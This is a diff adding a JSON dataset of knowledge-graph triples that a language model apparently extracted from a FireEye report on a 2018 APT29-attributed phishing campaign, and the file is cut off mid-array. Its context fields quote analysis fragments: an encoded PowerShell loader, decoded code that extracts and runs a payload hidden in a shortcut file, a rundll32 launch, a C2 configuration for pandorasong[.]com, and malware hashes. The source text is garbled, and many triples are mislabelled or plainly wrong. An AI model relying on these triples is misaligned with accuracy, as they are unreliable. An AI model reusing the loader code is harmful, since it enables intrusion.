@@ -1,0 +1,1125 @@
+{
+  "metrics": {
+    "file_name": "NotSoCozy.pdf",
+    "model_used": "gemma2:9b",
+    "doc_sha256_id": "305db44c02560462",
+    "num_pages": 11,
+    "num_sentences_total": 119,
+    "num_sentences_used": 80,
+    "num_raw_triples": 80,
+    "num_valid_triples": 46,
+    "num_suspicious_triples": 34,
+    "avg_triples_per_sentence": 1.0,
+    "rejection_stats": {
+      "bad_structure": 0,
+      "invalid_class_or_predicate": 34
+    },
+    "runtime_seconds": 86.58143091201782
+  },
+  "data": [
+    {
+      "context": "This campaign has targeted over 20 FireEye customers across: Defense, Imagery, Law Enforcement, Local Government, Media, Military, Pharmaceutical, Think Tank, Transportation, & US Public Sector industries in multiple geographic '",
+      "triple": [
+        {
+          "subject": {
+            "name": "This campaign",
+            "type": "Campaign"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "over 20 FireEye customers",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "This campaign has targeted over 20 FireEye customers"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "FireEye (@FireEye) November 15, 2018 The a ! acker appears to have compromised the email server of a hospital and the corporate website of a consulting company in order to use their infrastructure to send phishing emails.",
+      "triple": [
+        {
+          "subject": {
+            "name": "The attacker",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "the email server of a hospital",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "compromised the email server of a hospital"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Several elements from this campaign - including the resources invested in the phishing email and network infrastructure, the metadata from the weaponized sho \" cut # le payload, and the speci # c victim individuals and organizations targeted - are directly linked to the last observed APT29 phishing campaign from November 2016.",
+      "triple": [
+        {
+          "subject": {
+            "name": "campaign",
+            "type": "Campaign"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "victim individuals and organizations",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "the specific victim individuals and organizations targeted"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "It has also been over a year since we have conclusively identi # ed APT29 activity, which raises questions about the timing and the similarities of the activity a & er such a long interlude.",
+      "triple": [
+        {
+          "subject": {
+            "name": "APT29",
+            "type": "ThreatActor"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "activity",
+            "type": "AttackPattern"
+          },
+          "evidence": {
+            "quote": "We have conclusively identi # ed APT29 activity"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "014",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Notable similarities between this and the 2016 campaign include the Windows sho \" cut metadata, targeted organizations and speci # c individuals, phishing email construction, and the use of compromised infrastructure.",
+      "triple": [
+        {
+          "subject": {
+            "name": "this",
+            "type": "Campaign"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "organizations and specific individuals",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "targeted organizations and specific individuals"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Notable di $ erences include the use of Cobalt Strike, rather than custom malware; however, many espionage actors do use publicly and commercially available frameworks for reasons such as plausible deniability.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Espionage actors",
+            "type": "ThreatActor"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "publicly and commercially available frameworks",
+            "type": "Software"
+          },
+          "evidence": {
+            "quote": "for reasons such as plausible deniability."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "016",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " During the phishing campaign, there were indications that the site hosting the malware was selectively serving payloads.",
+      "triple": [
+        {
+          "subject": {
+            "name": "site",
+            "type": "DomainName"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "payloads",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "indications that the site hosting the malware was selectively serving payloads"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "For example, requests using incorrect HTTP headers repo \" edly served ZIP archives containing only the benign publicly available Depa \" ment of State form.",
+      "triple": [
+        {
+          "subject": {
+            "name": "requests",
+            "type": "AttackPattern"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "HTTP headers",
+            "type": "Protocol"
+          },
+          "evidence": {
+            "quote": "requests using incorrect HTTP headers"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The sho \" cut # le was cra & ed to execute a PowerShell command that read, decoded, and executed additional code from within the sho \" cut # le.",
+      "triple": [
+        {
+          "subject": {
+            "name": "sho \" cut # le",
+            "type": "Filepath"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "PowerShell command that read, decoded, and executed additional code from within the sho \" cut # le",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "The sho \" cut # le was cra & ed to execute a PowerShell command that read, decoded, and executed additional code from within the sho \" cut # le"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The BEACON payload was con # gured with a modi # ed variation of the publicly available \"Pandora\" Malleable C2 Pro # le and used a command and control (C2) domain pandorasong[.]com - assessed to be a masquerade of the Pandora music streaming service.",
+      "triple": [
+        {
+          "subject": {
+            "name": "BEACON",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "Pandora Malleable C2 Pro # le",
+            "type": "Application"
+          },
+          "evidence": {
+            "quote": "The BEACON payload was con # gured with a modi # ed variation of the publicly available \"Pandora\" Malleable C2 Pro # le "
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "011",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The sho \" cut metadata indicates it was built on the same or very similar system as the sho \" cut used in the November 2016 campaign.",
+      "triple": [
+        {
+          "subject": {
+            "name": "sho \" cut metadata",
+            "type": "Indicator"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "system",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "indicates it was built on the same or very similar system"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "013",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The malicious LNK used in the recent spearphishing campaign, ds7002.lnk (MD5: 6ed0020b0851 ' 71d5b0076f4ee95f3c), has technical overlaps with a suspected APT29 LNK from November 2016, 37486-theshocking-truth-about-election-rigging-in-america. \"",
+      "triple": [
+        {
+          "subject": {
+            "name": "ds7002.lnk",
+            "type": "Filename"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "6ed0020b0851 ' 71d5b0076f4ee95f3c",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": "ds7002.lnk (MD5: 6ed0020b0851 ' 71d5b0076f4ee95f3c)"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "016",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "f.lnk (MD5: f713d5df826c6051e65f995e57d6817d), which was publicly repo \" ed by Volexity.",
+      "triple": [
+        {
+          "subject": {
+            "name": "f.lnk",
+            "type": "Filename"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "f713d5df826c6051e65f995e57d6817d",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": "f713d5df826c6051e65f995e57d6817d"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "017",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The 2018 and 2016 LNK # les are similar in structure and code, and contain signi # cant metadata overlap, including the MAC address of the system on which the LNK was created.",
+      "triple": [
+        {
+          "subject": {
+            "name": "LNK #",
+            "type": "Malware"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "MAC address",
+            "type": "Hardware"
+          },
+          "evidence": {
+            "quote": "including the MAC address of the system on which the LNK was created."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "018",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Additional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these LNK # le.",
+      "triple": [
+        {
+          "subject": {
+            "name": "phishing campaigns",
+            "type": "Campaign"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "LNK",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "targeting and tactics employed in the phishing campaigns responsible for distributing these LNK"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "019",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves of emails in previous campaigns.",
+      "triple": [
+        {
+          "subject": {
+            "name": "activity",
+            "type": "AttackPattern"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "some of the same recipients of this email campaign",
+            "type": "EmailAddress"
+          },
+          "evidence": {
+            "quote": "activity targeted some of the same recipients"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "For network defenders, whether or not this activity was conducted by APT29 should be secondary to properly investigating the full scope of the intrusion, which is of critical impo \" ance if the elusive and deceptive APT29 operators indeed had access to your environment.",
+      "triple": [
+        {
+          "subject": {
+            "name": "APT29",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "evasive",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "elusive and deceptive APT29 operators indeed had access to your environment."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Technical Details Phishing Emails were sent from DOSOneDriveNoti # cations-svCT- Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa 15382822aa25821925a0245@no \" hshorehealthgm[.]org with the subject Stevenson, Susan N shared \"TP18-DS7002 (UNCLASSIFIED)\" with you.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Phishing Emails",
+            "type": "AttackPattern"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "DOSOneDriveNoti # cations-svCT- Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa 15382822aa25821925a0245@no hshorehealthgm[.]org",
+            "type": "EmailAddress"
+          },
+          "evidence": {
+            "quote": "Phishing Emails were sent from DOSOneDriveNoti # cations-svCT- Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa 15382822aa25821925a0245@no hshorehealthgm[.]org"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "le e $ o \" to hide the true source of the emails, including that they were not actually sent from the Depa \" ment of State.",
+      "triple": [
+        {
+          "subject": {
+            "name": "emails",
+            "type": "EmailAddress"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "$ ",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "to hide the true source of the emails, including that they were not actually sent from the Depa \" ment of State."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "012",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The # rst variant (MD5: 3fccf531 $ 0ae6fedd7c586774b17a2d), contained ds7002.lnk (MD5: 6ed0020b0851 ' 71d5b0076f4ee95f3c).",
+      "triple": [
+        {
+          "subject": {
+            "name": "The # rst variant",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "3fccf531 $ 0ae6fedd7c586774b17a2d",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": "MD5: 3fccf531 $ 0ae6fedd7c586774b17a2d)"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "ds7002.lnk was a malicious sho \" cut (LNK) # le that contained an embedded BEACON DLL and decoy PDF, and was cra ed to launch a PowerShell command.",
+      "triple": [
+        {
+          "subject": {
+            "name": "ds7002.lnk",
+            "type": "Filename"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "BEACON DLL",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "contained an embedded BEACON DLL"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "016",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The other observed variant of ds7002.zip (MD5: 658c6fe38f95995fa8dc8f6cfe41df7b) contained only the benign decoy",
+      "triple": [
+        {
+          "subject": {
+            "name": "ds7002.zip",
+            "type": "Filename"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "decoy",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "contained only the benign decoy"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "018",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The decoy document ds7002.pdf (MD5: 313f4808aa2a2073005d219bc68971cd) appears to have been downloaded from hxxps://eforms.state.gov/Forms/ds7002.PDF.",
+      "triple": [
+        {
+          "subject": {
+            "name": "ds7002.pdf",
+            "type": "Filename"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "313f4808aa2a2073005d219bc68971cd",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": " (MD5: 313f4808aa2a2073005d219bc68971cd)"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The BEACON backdoor communicated with the C2 domain pandorasong[.]com (95.216.59[.]92).",
+      "triple": [
+        {
+          "subject": {
+            "name": "BEACON",
+            "type": "Backdoor"
+          },
+          "predicate": "communicatesWith",
+          "object": {
+            "name": "pandorasong[.]com",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "The BEACON backdoor communicated with the C2 domain pandorasong[.]com"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Our analysis indicates that the a ! acker sta \" ed con # guring infrastructure approximately 30 days prior to the a ! ack.",
+      "triple": [
+        {
+          "subject": {
+            "name": "! a cker",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "infrastructure",
+            "type": "Infrastructure"
+          },
+          "evidence": {
+            "quote": "the a ! acker sta "
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Table 1: Operational timeline Execution Upon execution of the malicious LNK, ds7002.lnk (MD5: 6ed0020b0851 ' 71d5b0076f4ee95f3c), the following PowerShell command was executed:",
+      "triple": [
+        {
+          "subject": {
+            "name": "ds7002.lnk",
+            "type": "Filename"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "LNK",
+            "type": "Filename"
+          },
+          "evidence": {
+            "quote": "execution of the malicious LNK, ds7002.lnk"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "bypass $zk='JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5 rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJE Vudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W 0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUp O30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ",
+      "triple": [
+        {
+          "subject": {
+            "name": "$zk",
+            "type": "Unknown"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "JHB0Z3Q5MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5 rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJE Vudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W 0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUp O30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "$zk hasVulnerability JHB0Z3Q5MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5 rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJE Vudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W 0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUp O30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "For example, the use of 'FromBase'+0x40+'String', in place of FromBase64String, the PowerShell command used to decode base64.",
+      "triple": [
+        {
+          "subject": {
+            "name": "PowerShell",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "'FromBase'+0x40+'String'",
+            "type": "CommandAndControl"
+          },
+          "evidence": {
+            "quote": "PowerShell command used to decode base64"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The decoded command consisted of additional PowerShell that read the content of ds7002.lnk from o $ set 0x5e2be to o $ set 0x623b6, base64 decoded the extracted content, and executed it as additional PowerShell content.",
+      "triple": [
+        {
+          "subject": {
+            "name": "ds7002.lnk",
+            "type": "Filename"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "PowerShell",
+            "type": "Application"
+          },
+          "evidence": {
+            "quote": "read the content of ds7002.lnk from o $ set 0x5e2be to o $ set 0x623b6"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The embedded PowerShell code decoded to the following: $ptgt=0x0005e2be; $vcq=0x000623b6; $tb=\"ds7002.lnk\"; if (-not(Test-Path $tb)) { $oe=Get-ChildItem -Path $Env:temp -Filter $tb -Recurse; if (-not $oe) { exit }",
+      "triple": [
+        {
+          "subject": {
+            "name": "$ptgt",
+            "type": "IPAddress"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "0x0005e2be",
+            "type": "IPAddress"
+          },
+          "evidence": {
+            "quote": "$ptgt=0x0005e2be;"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "; } $vzvi=New-Object IO.FileStream $tb,'Open','Read','ReadWrite'; $oe=New-Object byte[]($vcq-$ptgt); $r=$vzvi.Seek($ptgt,[IO.SeekOrigin]::Begin); $r=$vzvi.Read($oe,0,$vcq-$ptgt); $oe=[Convert]::FromBase64CharArray($oe,0,$oe.",
+      "triple": [
+        {
+          "subject": {
+            "name": "$vzvi",
+            "type": "Filepath"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "$tb",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "FileStream $tb"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The BEACON loader DLL is executed with the expo \" function \"PointFunctionCall\": [TRUNCATED] $jzffhy = [IO.FileAccess]::READ $gibisec = myayxvj $(\"ds7002.lnk\") $oufgke = 0x48bd8 $wabxu = 0x5e2be - $oufgke $lblij = bygtqi $gibisec $oufgke $wabxu $(\"%TEMP%\\ds7002.PDF\") Invoke-Item $((lylyvve @((7,(30 + 0x34 - 3),65,(84 - 5),(-38 + 112),(-16 + 0x25 + 52))) 35))",
+      "triple": [
+        {
+          "subject": {
+            "name": "BEACON loader DLL",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "expo function \"PointFunctionCall\"",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "The BEACON loader DLL is executed with the expo \" function \"PointFunctionCall\""
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "$oufgke = 0x0dd8 $wabxu = 0x48bd8 - $oufgke $yhcgpw = bygtqi $gibisec $oufgke $wabxu $(\"%LOCALAPPDATA%\\cyzfc.dat\") if ($ENV:PROCESSOR_ARCHITECTURE -eq $(\"AMD64\")) { & ($(\"rundll32.exe\"))",
+      "triple": [
+        {
+          "subject": {
+            "name": "$oufgke",
+            "type": "MD5"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "0x0dd8",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": "$oufgke = 0x0dd8"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "$(\",\") $(\"PointFunctionCall\") } Files Dropped Upon successful execution of the LNK # le, it dropped the following # les to the victim's system: %APPDATA%\\Local\\cyzfc.dat (MD5: 16bbc967a8b6a365871a05c74a4f345b) BEACON loader DLL %TEMP%\\ds7002.PDF (MD5: 313f4808aa2a2073005d219bc68971cd) Decoy document",
+      "triple": [
+        {
+          "subject": {
+            "name": "Files",
+            "type": "Unknown"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "MD5: 16bbc967a8b6a365871a05c74a4f345b",
+            "type": "Hash"
+          },
+          "evidence": {
+            "quote": "the following # les to the victim's system: %APPDATA%\\Local\";cyzfc.dat (MD5: 16bbc967a8b6a365871a05c74a4f345b)"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "DLNA.ORG: 1 Host: pandorasong[.]com Cookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7; jitter: 17 named_pipes: \\\\\\\\%s\\\\pipe\\\\msagent_%x process_inject_targets: %windir%\\\\syswow64\\\\rundll32.exe %windir%\\\\sysnative\\\\rundll32.exe beacon_interval: 300 c2: conntype: SSL host: pandorasong[.]com port: 443 c2_urls: pandorasong[.]com/radio/xmlrpc/v45 pandorasong[.]com/access/ c2_user_agents: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Network Communications A & er successful installation/initialization of the malware, it made the following callback to the C2 server pandorasong[.]com via TCP/443 SSL.",
+      "triple": [
+        {
+          "subject": {
+            "name": "malware",
+            "type": "Malware"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": null,
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "A & er successful installation/initialization of the malware, it made the following callback to the C2 server pandorasong[.]com via TCP/443 SSL."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The sample was con # gured to use a malleable C2 pro # le for its network communications.",
+      "triple": [
+        {
+          "subject": {
+            "name": "sample",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "malleable C2 profile",
+            "type": "CommandAndControl"
+          },
+          "evidence": {
+            "quote": "use a malleable C2 pro # le"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "DLNA.ORG: 1 Host: pandorasong.com Cookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7; User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko Connection: Keep-Alive Cache-Control: no-cache Similarities to Older Activity",
+      "triple": [
+        {
+          "subject": {
+            "name": "DLNA.ORG",
+            "type": "DomainName"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "1 Host: pandorasong.com",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "DLNA.ORG: 1 Host: pandorasong.com"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Figure 5 and Figure 6 show the overlapping characteristics between the LNK used in the recent spear phish emails, ds7002.lnk (MD5: 6ed0020b0851 ' 71d5b0076f4ee95f3c), compared to a suspected APT29 LNK from the November 2016",
+      "triple": [
+        {
+          "subject": {
+            "name": "ds7002.lnk",
+            "type": "Filename"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "6ed0020b0851 ' 71d5b0076f4ee95f3c",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": "ds7002.lnk (MD5: 6ed0020b0851 ' 71d5b0076f4ee95f3c)"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "ack that led to the SPIKERUSH backdoor, 37486-theshocking-truth-about-election-rigging-in-america. \"",
+      "triple": [
+        {
+          "subject": {
+            "name": "ack",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "SPIKERUSH backdoor",
+            "type": "Backdoor"
+          },
+          "evidence": {
+            "quote": "ack that led to the SPIKERUSH backdoor"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "f.lnk (MD5: f713d5df826c6051e65f995e57d6817d).",
+      "triple": [
+        {
+          "subject": {
+            "name": "f.lnk",
+            "type": "Filename"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "f713d5df826c6051e65f995e57d6817d",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": "f713d5df826c6051e65f995e57d6817d)"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "new activity (le \" ) and old activity (right) Figure 8: Shared string obfuscation logic: new LNK activity (le \" ) and old VERNALDROP activity (right) Indicators",
+      "triple": [
+        {
+          "subject": {
+            "name": "LNK",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "activity",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "new LNK activity (le \" ) and old VERNALDROP activity (right) Indicators"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Table 2: Indicators Related Samples 37486-the-shocking-truth-about-election-rigging-in-america. \"",
+      "triple": [
+        {
+          "subject": {
+            "name": "Table 2",
+            "type": "Unknown"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "Indicators Related Samples",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "Table 2: Indicators Related Samples"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 10,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "f.lnk (MD5: f713d5df826c6051e65f995e57d6817d) FireEye Detection FireEye detected this activity across our pla ) orm.",
+      "triple": [
+        {
+          "subject": {
+            "name": "f.lnk",
+            "type": "Filename"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "MD5: f713d5df826c6051e65f995e57d6817d",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": " (MD5: f713d5df826c6051e65f995e57d6817d)"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 10,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Related articles Table 3: FireEye product detections Posted in Threat Intelligence-Security & Identity Follow us Threat Intelligence By Mandiant • 26-minute read Threat Intelligence By Mandiant • 13-minute read Threat Intelligence By Mandiant • 8-minute read Threat Intelligence By Google Threat Intelligence Group • 13-minute read XRefer: The Gemini-",
+      "triple": [
+        {
+          "subject": {
+            "name": "Threat Intelligence By Mandiant",
+            "type": "Organization"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "XRefer",
+            "type": "Campaign"
+          },
+          "evidence": {
+            "quote": "Threat Intelligence By Mandiant • 13-minute read Threat Intelligence By Mandiant • 8-minute read Threat Intelligence By Mandiant • 13-minute read XRefer: The Gemini-"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Assisted Binary Navigator Bridging the Gap: Elevating Red Team Assessments with Application Security Testing (QR)",
+      "triple": [
+        {
+          "subject": {
+            "name": "Assisted Binary Navigator",
+            "type": "Application"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Bridging the Gap",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "Assisted Binary Navigator Bridging the Gap"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
